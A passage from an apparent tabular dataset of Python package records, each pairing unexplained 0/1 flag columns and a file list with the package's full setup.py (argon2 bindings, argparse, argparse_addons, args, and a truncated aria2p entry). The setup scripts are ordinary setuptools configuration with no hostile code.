    ""Operating System :: Microsoft :: Windows"",
    ""Operating System :: POSIX"",
    ""Operating System :: Unix"",
    ""Programming Language :: Python :: 3"",
    ""Programming Language :: Python :: 3.6"",
    ""Programming Language :: Python :: 3.7"",
    ""Programming Language :: Python :: 3.8"",
    ""Programming Language :: Python :: 3.9"",
    ""Programming Language :: Python :: 3.10"",
    ""Programming Language :: Python :: Implementation :: CPython"",
    ""Programming Language :: Python :: Implementation :: PyPy"",
    ""Programming Language :: Python"",
    ""Topic :: Security :: Cryptography"",
    ""Topic :: Security"",
    ""Topic :: Software Development :: Libraries :: Python Modules"",
]


###############################################################################


if platform.python_implementation() == ""CPython"":
    try:
        import wheel.bdist_wheel
    except ImportError:
        BDistWheel = None
    else:

        class BDistWheel(wheel.bdist_wheel.bdist_wheel):
            def finalize_options(self):
                self.py_limited_api = f""cp3{sys.version_info[1]}""
                wheel.bdist_wheel.bdist_wheel.finalize_options(self)


else:
    BDistWheel = None


if __name__ == ""__main__"":
    cmdclass = {}
    if BDistWheel is not None:
        cmdclass[""bdist_wheel""] = BDistWheel
    setup(
        name=NAME,
        use_scm_version=True,  # setuptools_scm
        description=DESCRIPTION,
        license=LICENSE,
        url=URL,
        project_urls=PROJECT_URLS,
        author=AUTHOR,
        author_email=EMAIL,
        maintainer=AUTHOR,
        maintainer_email=EMAIL,
        long_description=pathlib.Path(""README.md"").read_text(),
        long_description_content_type=""text/markdown"",
        keywords=KEYWORDS,
        packages=find_packages(where=""src""),
        package_dir={"""": ""src""},
        classifiers=CLASSIFIERS,
        python_requires=PYTHON_REQUIRES,
        setup_requires=SETUP_REQUIRES,
        install_requires=INSTALL_REQUIRES,
        extras_require=EXTRAS_REQUIRE,
        cmdclass=cmdclass,
        # CFFI
        zip_safe=False,
        ext_package=""_argon2_cffi_bindings"",
        cffi_modules=CFFI_MODULES,
    )
",0
argparse-1.4.0,0,1,1,1,1,0,0,0,dependency_links.txt PKG-INFO SOURCES.txt top_level.txt argparse.py make.bat Makefile argparse.rst conf.py index.rst license.rst Python-License.txt LICENSE.txt MANIFEST.in NEWS.txt PKG-INFO README.txt setup.cfg setup.py test_argparse.py,"import sys, os

from setuptools import setup, find_packages

import argparse

long_description = open('README.txt').read()


setup_args = dict(
    name=""argparse"",
    version=argparse.__version__,
    description='Python command-line parsing library',
    long_description=long_description,
    author=""Thomas Waldmann"",
    author_email=""tw@waldmann-edv.de"",
    url=""https://github.com/ThomasWaldmann/argparse/"",
    license=""Python Software Foundation License"",
    keywords=""argparse command line parser parsing"",
    platforms=""any"",
    classifiers=""""""\
Development Status :: 5 - Production/Stable
Environment :: Console
Intended Audience :: Developers
License :: OSI Approved :: Python Software Foundation License
Operating System :: OS Independent
Programming Language :: Python
Programming Language :: Python :: 2
Programming Language :: Python :: 3
Programming Language :: Python :: 2.3
Programming Language :: Python :: 2.4
Programming Language :: Python :: 2.5
Programming Language :: Python :: 2.6
Programming Language :: Python :: 2.7
Programming Language :: Python :: 3.0
Programming Language :: Python :: 3.1
Programming Language :: Python :: 3.2
Programming Language :: Python :: 3.3
Programming Language :: Python :: 3.4
Topic :: Software Development"""""".splitlines(),
    py_modules=['argparse'],
)

if __name__ == '__main__':
    setup(**setup_args)

",1
argparse_addons-0.8.0,0,1,1,1,1,0,1,0,dependency_links.txt PKG-INFO SOURCES.txt top_level.txt argparse_addons.py LICENSE Makefile MANIFEST.in PKG-INFO README.rst setup.cfg setup.py test_argparse_addons.py __init__.py,"#!/usr/bin/env python

from setuptools import setup
import argparse_addons

setup(name='argparse_addons',
      version=argparse_addons.__version__,
      description=('Additional argparse types and actions.'),
      long_description=open('README.rst', 'r').read(),
      author='Erik Moqvist',
      author_email='erik.moqvist@gmail.com',
      license='MIT',
      classifiers=[
          'License :: OSI Approved :: MIT License',
      ],
      keywords=['argparse'],
      url='https://github.com/eerimoq/argparse_addons',
      py_modules=['argparse_addons'],
      python_requires='>=3.6',
      install_requires=[
      ],
      test_suite=""tests"")
",0
args-0.1.0,0,1,1,0,0,0,0,0,dependency_links.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt args.py PKG-INFO setup.cfg setup.py,"# -*- coding: utf-8 -*-
""""""
args
~~~~

This simple module gives you an elegant interface for your command line argumemnts.

""""""

from setuptools import setup

setup(
    name='args',
    version='0.1.0',
    url='https://github.com/kennethreitz/args',
    license='BSD',
    author='Kenneth Reitz',
    author_email='me@kennethreitz.com',
    description='Command Arguments for Humans.',
    long_description=__doc__,
    py_modules=['args'],
    zip_safe=False,
    include_package_data=True,
    platforms='any',
    classifiers=[
        'Environment :: Web Environment',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: BSD License',
        'Operating System :: OS Independent',
        'Programming Language :: Python',
        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',
        'Topic :: Software Development :: Libraries :: Python Modules'
    ]
)
",1
aria2p-0.11.2,0,1,1,1,0,0,1,0,LICENSE PKG-INFO pyproject.toml README.md api.py add.py add_magnet.py add_metalink.py add_torrent.py call.py listen.py pause.py purge.py remove.py resume.py show.py top.py __init__.py main.py parser.py __init__.py client.py downloads.py interface.py options.py py.typed stats.py types.py utils.py __init__.py __main__.py .gitignore CACHEDIR.TAG README.md stepwise randomly_seed conftest.py bunsenlabs-helium-4.iso.torrent callbacks.py add-paused.conf default.conf max-5-dls.conf debian.metalink one-valid-one-invalid-downloads two-invalid-downloads two-valid-downloads linux_magnets 1-dl-2-uris.txt 1-dl-paused.txt 1-dl.txt 2-dls-paused.txt 2-dls.txt 3-dls.txt 3-magnets.txt 50-dls.txt big-download.txt max-dl-limit-10000.txt one-active-one-paused.txt small-download.txt small-file-and-paused-file.txt very-small-download.txt http_server.py test_add_magnet_method.log test_add_magnet_method[0].log test_add_magnet_method[1].log test_add_magnet_method[2].log test_add_magnet_method[3].log test_add_magnet_method[4].log test_add_magnet_method[5].log test_add_magnet_method[6].log test_add_magnet_method[7].log test_add_magnet_method[8].log test_add_magnet_method[9].log test_add_metalink_method.log test_add_metalink_method[0].log test_add_metalink_method[2].log test_add_metalink_method[3].log test_add_metalink_method[5].log test_add_metalink_method[6].log test_add_metalink_method[8].log test_add_metalink_method[9].log test_add_torrent_method.log test_add_torrent_method[0].log test_add_torrent_method[1].log test_add_torrent_method[2].log test_add_torrent_method[3].log test_add_torrent_method[4].log test_add_torrent_method[5].log test_add_torrent_method[6].log test_add_torrent_method[7].log test_add_torrent_method[8].log test_add_uris_method.log test_add_uris_method[0].log test_add_uris_method[1].log test_add_uris_method[2].log test_add_uris_method[3].log test_add_uris_method[4].log test_add_uris_method[5].log test_add_uris_method[6].log test_add_uris_method[7].log test_add_uris_method[8].log test_add_uris_method[9].log test_autopurge_method.log test_autopurge_method[0].log test_autopurge_method[1].log test_autopurge_method[2].log test_autopurge_method[4].log test_autopurge_method[6].log test_autopurge_method[7].log test_autopurge_method[8].log test_autopurge_method[9].log test_copy_files_method.log test_copy_files_method[0].log test_copy_files_method[1].log test_copy_files_method[2].log test_copy_files_method[3].log test_copy_files_method[4].log test_copy_files_method[5].log test_copy_files_method[6].log test_copy_files_method[8].log test_copy_files_method[9].log test_get_downloads_method.log test_get_downloads_method[0].log test_get_downloads_method[1].log test_get_downloads_method[2].log test_get_downloads_method[3].log test_get_downloads_method[4].log test_get_downloads_method[5].log test_get_downloads_method[6].log test_get_downloads_method[7].log test_get_downloads_method[8].log test_get_downloads_method[9].log test_get_download_method.log test_get_download_method[1].log test_get_download_method[2].log test_get_download_method[4].log test_get_download_method[5].log test_get_download_method[6].log test_get_download_method[8].log test_get_download_method[9].log test_get_global_options_method.log test_get_global_options_method[0].log test_get_global_options_method[1].log test_get_global_options_method[2].log test_get_global_options_method[3].log test_get_global_options_method[4].log test_get_global_options_method[6].log test_get_global_options_method[7].log test_get_global_options_method[8].log test_get_options_method.log test_get_options_method[0].log test_get_options_method[1].log test_get_options_method[2].log test_get_options_method[4].log test_get_options_method[5].log test_get_options_method[7].log test_get_options_method[8].log test_get_options_method[9].log test_get_stats_method.log test_get_stats_method[0].log test_get_stats_method[1].log test_get_stats_method[2].log test_get_stats_method[3].log test_get_stats_method[4].log test_get_stats_method[8].log test_get_stats_method[9].log test_listen_to_notifications.log test_listen_to_notifications[0].log test_listen_to_notifications[1].log test_listen_to_notifications[2].log test_listen_to_notifications[3].log test_listen_to_notifications[4].log test_listen_to_notifications[5].log test_listen_to_notifications[6].log test_listen_to_notifications[7].log test_listen_to_notifications[8].log test_listen_to_notifications[9].log test_listen_to_notifications_callbacks.log test_listen_to_notifications_callbacks[0].log test_listen_to_notifications_callbacks[1].log test_listen_to_notifications_callbacks[2].log test_listen_to_notifications_callbacks[3].log test_listen_to_notifications_callbacks[4].log test_listen_to_notifications_callbacks[5].log test_listen_to_notifications_callbacks[6].log test_listen_to_notifications_callbacks[7].log test_listen_to_notifications_callbacks[8].log test_listen_to_notifications_callbacks[9].log test_listen_to_notifications_no_thread.log test_listen_to_notifications_no_thread[0].log test_listen_to_notifications_no_thread[1].log test_listen_to_notifications_no_thread[2].log test_listen_to_notifications_no_thread[3].log test_listen_to_notifications_no_thread[4].log test_listen_to_notifications_no_thread[5].log test_listen_to_notifications_no_thread[6].log test_listen_to_notifications_no_thread[7].log test_listen_to_notifications_no_thread[8].log test_listen_to_notifications_no_thread[9].log test_listen_to_notifications_then_stop.log test_listen_to_notifications_then_stop[0].log test_listen_to_notifications_then_stop[1].log test_listen_to_notifications_then_stop[2].log test_listen_to_notifications_then_stop[3].log test_listen_to_notifications_then_stop[4].log test_listen_to_notifications_then_stop[5].log test_listen_to_notifications_then_stop[7].log test_listen_to_notifications_then_stop[8].log test_listen_to_notifications_then_stop[9].log test_move_down_method.log test_move_down_method[0].log test_move_down_method[1].log test_move_down_method[2].log test_move_down_method[3].log test_move_down_method[4].log test_move_down_method[5].log test_move_down_method[6].log test_move_down_method[7].log test_move_down_method[8].log test_move_down_method[9].log test_move_files_method.log test_move_files_method[0].log test_move_files_method[1].log test_move_files_method[2].log test_move_files_method[3].log test_move_files_method[4].log test_move_files_method[5].log test_move_files_method[6].log test_move_files_method[7].log test_move_files_method[8].log test_move_files_method[9].log test_move_method.log test_move_method[0].log test_move_method[1].log test_move_method[2].log test_move_method[3].log test_move_method[5].log test_move_method[6].log test_move_method[7].log test_move_method[8].log test_move_method[9].log test_move_to_bottom_method.log test_move_to_bottom_method[0].log test_move_to_bottom_method[1].log test_move_to_bottom_method[3].log test_move_to_bottom_method[4].log test_move_to_bottom_method[5].log test_move_to_bottom_method[6].log test_move_to_bottom_method[8].log test_move_to_bottom_method[9].log test_move_to_method.log test_move_to_method[0].log test_move_to_method[1].log test_move_to_method[2].log test_move_to_method[3].log test_move_to_method[4].log test_move_to_method[5].log test_move_to_method[6].log test_move_to_method[7].log test_move_to_method[8].log test_move_to_method[9].log test_move_to_top_method.log test_move_to_top_method[0].log test_move_to_top_method[1].log test_move_to_top_method[2].log test_move_to_top_method[3].log test_move_to_top_method[5].log test_move_to_top_method[6].log test_move_to_top_method[7].log test_move_to_top_method[9].log test_move_up_method.log test_move_up_method[0].log test_move_up_method[1].log test_move_up_method[2].log test_move_up_method[3].log test_move_up_method[4].log test_move_up_method[5].log test_move_up_method[6].log test_move_up_method[8].log test_move_up_method[9].log test_parse_input_file.log test_pause_all_method.log test_pause_all_method[0].log test_pause_all_method[1].log test_pause_all_method[2].log test_pause_all_method[3].log test_pause_all_method[4].log test_pause_all_method[5].log test_pause_all_method[6].log test_pause_all_method[7].log test_pause_all_method[8].log test_pause_all_method[9].log test_pause_method.log test_pause_method[0].log test_pause_method[1].log test_pause_method[2].log test_pause_method[3].log test_pause_method[4].log test_pause_method[5].log test_pause_method[6].log test_pause_method[7].log test_pause_method[8].log test_pause_method[9].log test_remove_all_method.log test_remove_all_method[0].log test_remove_all_method[1].log test_remove_all_method[2].log test_remove_all_method[3].log test_remove_all_method[4].log test_remove_all_method[5].log test_remove_all_method[6].log test_remove_all_method[7].log test_remove_all_method[8].log test_remove_all_method[9].log test_remove_files_method.log test_remove_files_method[0].log test_remove_files_method[1].log test_remove_files_method[2].log test_remove_files_method[4].log test_remove_files_method[5].log test_remove_files_method[6].log test_remove_files_method[7].log test_remove_files_method[8].log test_remove_files_method[9].log test_remove_files_not_complete.log test_remove_files_not_complete[0].log test_remove_files_not_complete[1].log test_remove_files_not_complete[2].log test_remove_files_not_complete[3].log test_remove_files_not_complete[4].log test_remove_files_not_complete[6].log test_remove_files_not_complete[7].log test_remove_files_not_complete[8].log test_remove_files_not_complete[9].log test_remove_files_tree.log test_remove_files_tree[0].log test_remove_files_tree[1].log test_remove_files_tree[2].log test_remove_files_tree[3].log test_remove_files_tree[4].log test_remove_files_tree[5].log test_remove_files_tree[6].log test_remove_files_tree[7].log test_remove_files_tree[8].log test_remove_files_tree[9].log test_remove_method.log test_remove_method[0].log test_remove_method[1].log test_remove_method[2].log test_remove_method[4].log test_remove_method[6].log test_remove_method[7].log test_remove_method[8].log test_resume_all_method.log test_resume_all_method[0].log test_resume_all_method[1].log test_resume_all_method[2].log test_resume_all_method[4].log test_resume_all_method[5].log test_resume_all_method[6].log test_resume_all_method[7].log test_resume_all_method[8].log test_resume_all_method[9].log test_resume_method.log test_resume_method[0].log test_resume_method[1].log test_resume_method[3].log test_resume_method[4].log test_resume_method[5].log test_resume_method[6].log test_resume_method[7].log test_resume_method[8].log test_resume_method[9].log test_set_global_options_method.log test_set_global_options_method[0].log test_set_global_options_method[1].log test_set_global_options_method[2].log test_set_global_options_method[3].log test_set_global_options_method[4].log test_set_global_options_method[5].log test_set_global_options_method[6].log test_set_global_options_method[7].log test_set_global_options_method[9].log test_set_options_method.log test_set_options_method[0].log test_set_options_method[1].log test_set_options_method[2].log test_set_options_method[3].log test_set_options_method[4].log test_set_options_method[5].log test_set_options_method[6].log test_set_options_method[7].log test_set_options_method[8].log test_set_options_method[9].log test_add_magnet_subcommand.log test_add_magnet_subcommand[13].log test_add_magnet_subcommand[14].log test_add_magnet_subcommand[16].log test_add_magnet_subcommand[1].log test_add_magnet_subcommand[22].log test_add_magnet_subcommand[24].log test_add_magnet_subcommand[2].log test_add_magnet_subcommand[31].log test_add_magnet_subcommand[36].log test_add_magnet_subcommand[37].log test_add_magnet_subcommand[43].log test_add_magnet_subcommand[45].log test_add_magnet_subcommand[6].log test_add_magnet_subcommand[7].log test_add_metalink_subcommand.log test_add_metalink_subcommand[11].log test_add_metalink_subcommand[13].log test_add_metalink_subcommand[22].log test_add_metalink_subcommand[23].log test_add_metalink_subcommand[25].log test_add_metalink_subcommand[26].log test_add_metalink_subcommand[28].log test_add_metalink_subcommand[32].log test_add_metalink_subcommand[35].log test_add_metalink_subcommand[36].log test_add_metalink_subcommand[39].log test_add_metalink_subcommand[46].log test_add_torrent_subcommand.log test_add_torrent_subcommand[12].log test_add_torrent_subcommand[1].log test_add_torrent_subcommand[29].log test_add_torrent_subcommand[2].log test_add_torrent_subcommand[31].log test_add_torrent_subcommand[32].log test_add_torrent_subcommand[37].log test_add_torrent_subcommand[38].log test_add_torrent_subcommand[39].log test_add_torrent_subcommand[40].log test_add_torrent_subcommand[41].log test_add_torrent_subcommand[43].log test_add_torrent_subcommand[5].log test_call_subcommand.log test_call_subcommand[13].log test_call_subcommand[16].log test_call_subcommand[17].log test_call_subcommand[18].log test_call_subcommand[20].log test_call_subcommand[22].log test_call_subcommand[24].log test_call_subcommand[27].log test_call_subcommand[28].log test_call_subcommand[30].log test_call_subcommand[35].log test_call_subcommand[37].log test_call_subcommand[40].log test_call_subcommand[42].log test_call_subcommand[43].log test_call_subcommand[46].log test_call_subcommand[4].log test_call_subcommand[5].log test_call_subcommand[9].log test_call_subcommand_with_json_params.log test_call_subcommand_with_json_params[11].log test_call_subcommand_with_json_params[12].log test_call_subcommand_with_json_params[17].log test_call_subcommand_with_json_params[1].log test_call_subcommand_with_json_params[20].log test_call_subcommand_with_json_params[25].log test_call_subcommand_with_json_params[27].log test_call_subcommand_with_json_params[28].log test_call_subcommand_with_json_params[2].log test_call_subcommand_with_json_params[35].log test_call_subcommand_with_json_params[3].log test_call_subcommand_with_json_params[45].log test_call_subcommand_with_json_params[9].log test_call_subcommand_with_no_params.log test_call_subcommand_with_no_params[10].log test_call_subcommand_with_no_params[15].log test_call_subcommand_with_no_params[16].log test_call_subcommand_with_no_params[17].log test_call_subcommand_with_no_params[18].log test_call_subcommand_with_no_params[21].log test_call_subcommand_with_no_params[22].log test_call_subcommand_with_no_params[24].log test_call_subcommand_with_no_params[26].log test_call_subcommand_with_no_params[27].log test_call_subcommand_with_no_params[32].log test_call_subcommand_with_no_params[34].log test_call_subcommand_with_no_params[35].log test_call_subcommand_with_no_params[3].log test_call_subcommand_with_no_params[41].log test_call_subcommand_with_no_params[46].log test_call_subcommand_with_no_params[4].log test_errors_and_print_message.log test_errors_and_print_message[11].log test_errors_and_print_message[16].log test_errors_and_print_message[19].log test_errors_and_print_message[1].log test_errors_and_print_message[23].log test_errors_and_print_message[26].log test_errors_and_print_message[29].log test_errors_and_print_message[34].log test_errors_and_print_message[39].log test_errors_and_print_message[42].log test_errors_and_print_message[44].log test_errors_and_print_message[47].log test_error_when_missing_arg[add-magnet-uris].log test_error_when_missing_arg[add-metalink-metalink_files].log test_error_when_missing_arg[add-torrent-torrent_files].log test_error_when_missing_arg[add-uris].log test_listen_subcommand.log test_listen_subcommand[10].log test_listen_subcommand[11].log test_listen_subcommand[12].log test_listen_subcommand[14].log test_listen_subcommand[16].log test_listen_subcommand[17].log test_listen_subcommand[19].log test_listen_subcommand[1].log test_listen_subcommand[22].log test_listen_subcommand[31].log test_listen_subcommand[33].log test_listen_subcommand[35].log test_listen_subcommand[37].log test_listen_subcommand[42].log test_listen_subcommand[45].log test_listen_subcommand[4].log test_listen_subcommand[7].log test_listen_subcommand[9].log test_main_no_command_defaults_to_top.log test_main_no_command_defaults_to_top[12].log test_main_no_command_defaults_to_top[17].log test_main_no_command_defaults_to_top[18].log test_main_no_command_defaults_to_top[1].log test_main_no_command_defaults_to_top[25].log test_main_no_command_defaults_to_top[28].log test_main_no_command_defaults_to_top[29].log test_main_no_command_defaults_to_top[31].log test_main_no_command_defaults_to_top[34].log test_main_no_command_defaults_to_top[35].log test_main_no_command_defaults_to_top[38].log test_main_no_command_defaults_to_top[40].log test_main_no_command_defaults_to_top[45].log test_main_no_command_defaults_to_top[46].log test_main_no_command_defaults_to_top[4].log test_main_no_command_defaults_to_top[6].log test_main_returns_2_when_no_remote_running.log test_main_returns_2_when_no_remote_running[11].log test_main_returns_2_when_no_remote_running[12].log test_main_returns_2_when_no_remote_running[19].log test_main_returns_2_when_no_remote_running[22].log test_main_returns_2_when_no_remote_running[26].log test_main_returns_2_when_no_remote_running[28].log test_main_returns_2_when_no_remote_running[29].log test_main_returns_2_when_no_remote_running[37].log test_main_returns_2_when_no_remote_running[39].log test_main_returns_2_when_no_remote_running[46].log test_main_returns_2_when_no_remote_running[49].log test_main_returns_2_when_no_remote_running[4].log test_main_returns_2_when_no_remote_running[6].log test_main_returns_2_when_no_remote_running[7].log test_main_returns_2_when_no_remote_running[9].log test_main_show_subcommand.log test_main_show_subcommand[12].log test_main_show_subcommand[1].log test_main_show_subcommand[23].log test_main_show_subcommand[24].log test_main_show_subcommand[2].log test_main_show_subcommand[31].log test_main_show_subcommand[32].log test_main_show_subcommand[33].log test_main_show_subcommand[37].log test_main_show_subcommand[38].log test_main_show_subcommand[40].log test_main_show_subcommand[42].log test_main_show_subcommand[46].log test_main_show_subcommand[48].log test_main_show_subcommand[6].log test_main_show_subcommand[7].log test_no_interface_deps_print_error.log test_no_interface_deps_print_error[13].log test_no_interface_deps_print_error[16].log test_no_interface_deps_print_error[25].log test_no_interface_deps_print_error[26].log test_no_interface_deps_print_error[28].log test_no_interface_deps_print_error[29].log test_no_interface_deps_print_error[34].log test_no_interface_deps_print_error[40].log test_no_interface_deps_print_error[42].log test_no_interface_deps_print_error[46].log test_no_interface_deps_print_error[47].log test_no_interface_deps_print_error[48].log test_no_interface_deps_print_error[6].log test_parser_error_when_gids_and_all_option.log test_parser_error_when_gids_and_all_option[11].log test_parser_error_when_gids_and_all_option[13].log test_parser_error_when_gids_and_all_option[14].log test_parser_error_when_gids_and_all_option[15].log test_parser_error_when_gids_and_all_option[17].log test_parser_error_when_gids_and_all_option[20].log test_parser_error_when_gids_and_all_option[26].log test_parser_error_when_gids_and_all_option[27].log test_parser_error_when_gids_and_all_option[28].log test_parser_error_when_gids_and_all_option[29].log test_parser_error_when_gids_and_all_option[2].log test_parser_error_when_gids_and_all_option[33].log test_parser_error_when_gids_and_all_option[38].log test_parser_error_when_gids_and_all_option[3].log test_parser_error_when_gids_and_all_option[40].log test_parser_error_when_gids_and_all_option[8].log test_parser_error_when_gids_and_all_option[9].log test_parser_error_when_no_gid_and_no_all_option.log test_parser_error_when_no_gid_and_no_all_option[0].log test_parser_error_when_no_gid_and_no_all_option[14].log test_parser_error_when_no_gid_and_no_all_option[16].log test_parser_error_when_no_gid_and_no_all_option[17].log test_parser_error_when_no_gid_and_no_all_option[1].log test_parser_error_when_no_gid_and_no_all_option[28].log test_parser_error_when_no_gid_and_no_all_option[2].log test_parser_error_when_no_gid_and_no_all_option[33].log test_parser_error_when_no_gid_and_no_all_option[37].log test_parser_error_when_no_gid_and_no_all_option[40].log test_parser_error_when_no_gid_and_no_all_option[43].log test_parser_no_error.log test_parser_no_error[0].log test_parser_no_error[11].log test_parser_no_error[12].log test_parser_no_error[16].log test_parser_no_error[18].log test_parser_no_error[1].log test_parser_no_error[21].log test_parser_no_error[23].log test_parser_no_error[27].log test_parser_no_error[34].log test_parser_no_error[36].log test_parser_no_error[38].log test_parser_no_error[39].log test_parser_no_error[3].log test_parser_no_error[42].log test_parser_no_error[43].log test_parser_no_error[45].log test_parser_no_error[46].log test_parser_no_error[47].log test_parser_no_error[48].log test_parser_no_error[8].log test_parse_invalid_options.log test_parse_invalid_options[add-magnet].log test_parse_invalid_options[add-metalink].log test_parse_invalid_options[add-torrent].log test_parse_invalid_options[add].log test_parse_valid_options.log test_parse_valid_options[add-magnet].log test_parse_valid_options[add-metalink].log test_parse_valid_options[add-torrent].log test_parse_valid_options[add].log test_pause_all_subcommand.log test_pause_all_subcommand[13].log test_pause_all_subcommand[15].log test_pause_all_subcommand[19].log test_pause_all_subcommand[22].log test_pause_all_subcommand[24].log test_pause_all_subcommand[26].log test_pause_all_subcommand[29].log test_pause_all_subcommand[35].log test_pause_all_subcommand[39].log test_pause_all_subcommand[41].log test_pause_all_subcommand[42].log test_pause_all_subcommand[44].log test_pause_all_subcommand[49].log test_pause_all_subcommand[4].log test_pause_all_subcommand[6].log test_pause_all_subcommand_doesnt_fail_with_already_paused_download test_pause_subcommand.log test_pause_subcommand[10].log test_pause_subcommand[11].log test_pause_subcommand[13].log test_pause_subcommand[15].log test_pause_subcommand[16].log test_pause_subcommand[17].log test_pause_subcommand[18].log test_pause_subcommand[22].log test_pause_subcommand[26].log test_pause_subcommand[30].log test_pause_subcommand[35].log test_pause_subcommand[36].log test_pause_subcommand[43].log test_pause_subcommand[45].log test_pause_subcommand[4].log test_pause_subcommand_already_paused.log test_pause_subcommand_already_paused[14].log test_pause_subcommand_already_paused[19].log test_pause_subcommand_already_paused[1].log test_pause_subcommand_already_paused[20].log test_pause_subcommand_already_paused[22].log test_pause_subcommand_already_paused[26].log test_pause_subcommand_already_paused[28].log test_pause_subcommand_already_paused[29].log test_pause_subcommand_already_paused[32].log test_pause_subcommand_already_paused[35].log test_pause_subcommand_already_paused[38].log test_pause_subcommand_already_paused[3].log test_pause_subcommand_already_paused[43].log test_pause_subcommand_already_paused[45].log test_pause_subcommand_already_paused[49].log test_pause_subcommand_already_paused[4].log test_pause_subcommand_already_paused[7].log test_pause_subcommand_one_paused.log test_pause_subcommand_one_paused[10].log test_pause_subcommand_one_paused[12].log test_pause_subcommand_one_paused[17].log test_pause_subcommand_one_paused[18].log test_pause_subcommand_one_paused[25].log test_pause_subcommand_one_paused[27].log test_pause_subcommand_one_paused[29].log test_pause_subcommand_one_paused[32].log test_pause_subcommand_one_paused[37].log test_pause_subcommand_one_paused[42].log test_pause_subcommand_one_paused[45].log test_pause_subcommand_one_paused[49].log test_pause_subcommand_one_paused[4].log test_pause_subcommand_one_paused[9].log test_purge_subcommand.log test_purge_subcommand[0].log test_purge_subcommand[12].log test_purge_subcommand[1].log test_purge_subcommand[22].log test_purge_subcommand[28].log test_purge_subcommand[30].log test_purge_subcommand[31].log test_purge_subcommand[32].log test_purge_subcommand[34].log test_purge_subcommand[41].log test_purge_subcommand[4].log test_purge_subcommand[5].log test_purge_subcommand[6].log test_purge_subcommand[8].log test_remove_all_subcommand.log test_remove_all_subcommand[0].log test_remove_all_subcommand[11].log test_remove_all_subcommand[1].log test_remove_all_subcommand[22].log test_remove_all_subcommand[25].log test_remove_all_subcommand[30].log test_remove_all_subcommand[31].log test_remove_all_subcommand[32].log test_remove_all_subcommand[35].log test_remove_all_subcommand[36].log test_remove_all_subcommand[37].log test_remove_all_subcommand[45].log test_remove_all_subcommand[47].log test_remove_all_subcommand[49].log test_remove_all_subcommand[6].log test_remove_subcommand.log test_remove_subcommand[11].log test_remove_subcommand[12].log test_remove_subcommand[14].log test_remove_subcommand[19].log test_remove_subcommand[26].log test_remove_subcommand[29].log test_remove_subcommand[32].log test_remove_subcommand[35].log test_remove_subcommand[36].log test_remove_subcommand[38].log test_remove_subcommand[42].log test_remove_subcommand[44].log test_remove_subcommand[46].log test_remove_subcommand[49].log test_remove_subcommand[7].log test_remove_subcommand_one_failure.log test_remove_subcommand_one_failure[10].log test_remove_subcommand_one_failure[12].log test_remove_subcommand_one_failure[15].log test_remove_subcommand_one_failure[17].log test_remove_subcommand_one_failure[18].log test_remove_subcommand_one_failure[19].log test_remove_subcommand_one_failure[20].log test_remove_subcommand_one_failure[23].log test_remove_subcommand_one_failure[25].log test_remove_subcommand_one_failure[2].log test_remove_subcommand_one_failure[30].log test_remove_subcommand_one_failure[37].log test_remove_subcommand_one_failure[38].log test_remove_subcommand_one_failure[3].log test_remove_subcommand_one_failure[42].log test_remove_subcommand_one_failure[47].log test_remove_subcommand_one_failure[48].log test_remove_subcommand_one_failure[49].log test_remove_subcommand_one_failure[6].log test_resume_all_subcommand.log test_resume_all_subcommand[21].log test_resume_all_subcommand[22].log test_resume_all_subcommand[26].log test_resume_all_subcommand[28].log test_resume_all_subcommand[30].log test_resume_all_subcommand[32].log test_resume_all_subcommand[34].log test_resume_all_subcommand[36].log test_resume_all_subcommand[38].log test_resume_all_subcommand[39].log test_resume_all_subcommand[3].log test_resume_all_subcommand[41].log test_resume_all_subcommand[42].log test_resume_all_subcommand[43].log test_resume_all_subcommand[49].log test_resume_all_subcommand[6].log test_resume_all_subcommand[8].log test_resume_all_subcommand_doesnt_fail_with_already_active_downloa test_resume_subcommand.log test_resume_subcommand[13].log test_resume_subcommand[20].log test_resume_subcommand[22].log test_resume_subcommand[2].log test_resume_subcommand[30].log test_resume_subcommand[32].log test_resume_subcommand[33].log test_resume_subcommand[34].log test_resume_subcommand[37].log test_resume_subcommand[38].log test_resume_subcommand[45].log test_resume_subcommand[7].log test_resume_subcommand_already_unpaused.log test_resume_subcommand_already_unpaused[10].log test_resume_subcommand_already_unpaused[13].log test_resume_subcommand_already_unpaused[14].log test_resume_subcommand_already_unpaused[22].log test_resume_subcommand_already_unpaused[24].log test_resume_subcommand_already_unpaused[32].log test_resume_subcommand_already_unpaused[38].log test_resume_subcommand_already_unpaused[44].log test_resume_subcommand_already_unpaused[49].log test_resume_subcommand_already_unpaused[4].log test_resume_subcommand_already_unpaused[5].log test_resume_subcommand_already_unpaused[6].log test_resume_subcommand_one_unpaused.log test_resume_subcommand_one_unpaused[17].log test_resume_subcommand_one_unpaused[1].log test_resume_subcommand_one_unpaused[25].log test_resume_subcommand_one_unpaused[41].log test_resume_subcommand_one_unpaused[45].log test_resume_subcommand_one_unpaused[4].log test_resume_subcommand_one_unpaused[7].log test_show_help.log test_show_help[12].log test_show_help[19].log test_show_help[22].log test_show_help[23].log test_show_help[26].log test_show_help[29].log test_show_help[36].log test_show_help[37].log test_show_help[38].log test_show_help[3].log test_show_help[42].log test_show_help[44].log test_show_help[45].log test_show_help[47].log test_show_help[5].log test_show_subcommand.log test_show_subcommand[0].log test_show_subcommand[15].log test_show_subcommand[16].log test_show_subcommand[24].log test_show_subcommand[29].log test_show_subcommand[32].log test_show_subcommand[36].log test_show_subcommand[3].log test_show_subcommand[40].log test_show_subcommand[44].log test_show_subcommand[7].log test_add_metalink_method.log test_add_metalink_method[0].log test_add_metalink_method[10].log test_add_metalink_method[11].log test_add_metalink_method[12].log test_add_metalink_method[13].log test_add_metalink_method[14].log test_add_metalink_method[15].log test_add_metalink_method[16].log test_add_metalink_method[17].log test_add_metalink_method[18].log test_add_metalink_method[19].log test_add_metalink_method[1].log test_add_metalink_method[20].log test_add_metalink_method[21].log test_add_metalink_method[22].log test_add_metalink_method[23].log test_add_metalink_method[24].log test_add_metalink_method[25].log test_add_metalink_method[26].log test_add_metalink_method[27].log test_add_metalink_method[28].log test_add_metalink_method[29].log test_add_metalink_method[2].log test_add_metalink_method[30].log test_add_metalink_method[31].log test_add_metalink_method[32].log test_add_metalink_method[33].log test_add_metalink_method[34].log test_add_metalink_method[35].log test_add_metalink_method[36].log test_add_metalink_method[37].log test_add_metalink_method[38].log test_add_metalink_method[39].log test_add_metalink_method[3].log test_add_metalink_method[40].log test_add_metalink_method[41].log test_add_metalink_method[42].log test_add_metalink_method[43].log test_add_metalink_method[44].log test_add_metalink_method[45].log test_add_metalink_method[46].log 